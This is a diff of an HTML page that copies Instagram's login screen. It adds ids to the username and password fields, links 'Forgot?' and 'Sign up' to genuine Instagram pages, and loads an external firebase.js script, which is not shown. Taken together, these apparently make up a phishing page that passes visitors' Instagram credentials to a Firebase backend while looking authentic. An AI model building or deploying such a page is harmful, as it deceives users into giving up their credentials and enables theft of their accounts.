@@ -12,23 +12,26 @@
 <div id="wrapper">
     <div class="main-content">
         <div class="header">
-            <img src="https://i.imgur.com/zqpwkLQ.png" alt="Instagram Logo">
+            <img src="./insta.png" alt="Instagram Logo">
         </div>
         <div class="l-part">
-            <input type="text" placeholder="Username" class="input-1">
+            <input type="text" placeholder="Username" class="input-1" id="username">
             <div class="overlap-text">
-                <input type="password" placeholder="Password" class="input-2">
-                <a href="#">Forgot?</a>
+                <input type="password" placeholder="Password" class="input-2" id="password">
+                <a href="https://www.instagram.com/accounts/password/reset/">Forgot?</a>
             </div>
-            <button class="btn">Log in</button>
+            <button class="btn" id="login-btn">Log in</button>
         </div>
     </div>
     <div class="sub-content">
         <div class="s-part">
-            Don't have an account? <a href="#">Sign up</a>
+            Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
         </div>
     </div>
 </div>
+
+<!-- ✅ External JavaScript (Handles Firebase) -->
+<script type="module" src="firebase.js"></script>
 
 </body>
 </html>
